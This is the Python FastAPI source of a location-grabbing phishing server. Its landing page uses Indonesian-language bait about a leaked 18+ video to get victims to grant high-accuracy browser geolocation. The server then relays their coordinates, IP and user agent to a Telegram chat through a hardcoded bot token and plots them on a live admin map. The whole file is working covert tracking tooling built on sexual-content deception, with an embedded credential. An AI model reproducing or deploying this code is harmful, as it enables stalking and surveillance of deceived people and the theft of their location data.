import json
import os
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, FileResponse
import httpx
import uvicorn

app = FastAPI(title="GPS Telemetry Receiver")

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8791673811:AAGwPYv0hrGZGqarZA9w7_KOrUruGelViro")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "@imFreed0mLocationTest")

# In-memory storage for received location logs
location_logs = []

LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #f3f4f6; }
        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); max-width: 400px; text-align: center; margin: 1rem; }
        .btn { background: #2563eb; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 1.5rem; width: 100%; font-size: 1rem; }
        .status { margin-top: 1rem; font-size: 0.9rem; color: #6b7280; }
    </style>
</head>
<body>
    <div class="card">
        <img src="/test.jpg" alt="Preview" style="width: 100%; border-radius: 8px; margin-bottom: 1rem; object-fit: cover;">
        <h2>VIDEO MAHASISWI SEMARANG MAIN SAMA DOSEN</h2>
        <p>BOCOR!!! Full durasi Mahasiswi semarang main sama dosen</p>
        <button class="btn" onclick="requestLocation()">doodstream 18+</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        function requestLocation() {
            const status = document.getElementById('status');
            status.innerText = "Requesting location permissions...";

            if (!navigator.geolocation) {
                status.innerText = "Geolocation is not supported by your browser.";
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    status.innerText = "Transmitting telemetry...";
                    const payload = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed,
                        heading: position.coords.heading,
                        timestamp: new Date(position.timestamp).toISOString(),
                        user_agent: navigator.userAgent
                    };

                    try {
                        const res = await fetch('/api/telemetry', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });
                        if (res.ok) {
                            status.innerText = "Location verified successfully.";
                        } else {
                            status.innerText = "Server transmission error.";
                        }
                    } catch (e) {
                        status.innerText = "Network error transmitting data.";
                    }
                },
                (error) => {
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            status.innerText = "Permission denied by user.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            status.innerText = "Location information is unavailable.";
                            break;
                        case error.TIMEOUT:
                            status.innerText = "Location request timed out.";
                            break;
                        default:
                            status.innerText = "An unknown error occurred.";
                    }
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Live Location Monitor</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { margin: 0; padding: 0; font-family: sans-serif; display: flex; flex-direction: column; height: 100vh; }
        header { background: #1f2937; color: white; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
        #map { flex: 1; width: 100%; }
        #logs { height: 150px; overflow-y: auto; background: #111827; color: #10b981; font-family: monospace; font-size: 12px; padding: 10px; }
    </style>
</head>
<body>
    <header>
        <h3>Live GPS Receiver Admin Dashboard</h3>
        <span id="log-count">Pings Received: 0</span>
    </header>
    <div id="map"></div>
    <div id="logs">Waiting for incoming telemetry...</div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
        let markers = [];

        async function fetchLogs() {
            try {
                const res = await fetch('/api/logs');
                const data = await res.json();
                document.getElementById('log-count').innerText = `Pings Received: ${data.length}`;
                
                if (data.length > 0) {
                    const logsDiv = document.getElementById('logs');
                    logsDiv.innerHTML = data.map(l => `[${l.received_at}] IP: ${l.client_ip} | Lat: ${l.latitude}, Lng: ${l.longitude} (Acc: ${l.accuracy}m)`).join('<br>');
                    
                    const latest = data[data.length - 1];
                    markers.forEach(m => map.removeLayer(m));
                    markers = [];

                    const marker = L.marker([latest.latitude, latest.longitude])
                        .addTo(map)
                        .bindPopup(`<b>Latest Ping</b><br>Accuracy: ${latest.accuracy}m<br>Time: ${latest.received_at}`)
                        .openPopup();
                    markers.push(marker);

                    map.setView([latest.latitude, latest.longitude], 16);
                }
            } catch (e) {
                console.error("Fetch error", e);
            }
        }

        setInterval(fetchLogs, 3000);
        fetchLogs();
    </script>
</body>
</html>
"""

async def send_telegram_alert(telemetry: dict):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] Telegram credentials not configured. Skipping alert.")
        return

    lat = telemetry.get("latitude")
    lng = telemetry.get("longitude")
    acc = telemetry.get("accuracy")
    ip = telemetry.get("client_ip")
    timestamp = telemetry.get("received_at")
    ua = telemetry.get("user_agent", "Unknown")

    message = (
        f"🚨 *NEW GEOLOCATION TELEMETRY*\n\n"
        f"📍 *Coords:* `{lat}, {lng}`\n"
        f"🎯 *Accuracy:* ~{acc} meters\n"
        f"🌐 *IP:* `{ip}`\n"
        f"📱 *User-Agent:* `{ua}`\n"
        f"🕒 *Time:* {timestamp}\n\n"
        f"🗺️ [Open in Google Maps](https://www.google.com/maps?q={lat},{lng})"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": False
    }

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload, timeout=10.0)
            if response.status_code == 200:
                print(f"[+] Telegram alert sent successfully to chat_id {TELEGRAM_CHAT_ID}.")
            else:
                print(f"[-] Telegram API returned status {response.status_code}: {response.text}")
        except Exception as e:
            print(f"[-] Failed to send Telegram alert: {e}")

@app.get("/", response_class=HTMLResponse)
async def landing_page():
    return LANDING_HTML

@app.get("/test.jpg")
async def get_test_image():
    return FileResponse("test.jpg")

@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    return ADMIN_HTML

@app.post("/api/telemetry")
async def receive_telemetry(request: Request):
    client_ip = request.client.host if request.client else "Unknown"
    data = await request.json()
    data["client_ip"] = client_ip
    data["received_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    location_logs.append(data)
    
    print(f"\n[!] INCOMING GPS FIX: Lat {data.get('latitude')}, Lng {data.get('longitude')} (Accuracy: {data.get('accuracy')}m) from IP {client_ip}")
    
    # Asynchronously dispatch Telegram alert
    await send_telegram_alert(data)
    
    return {"status": "success"}

@app.get("/api/logs")
async def get_logs():
    return location_logs

if __name__ == "__main__":
    uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=False)
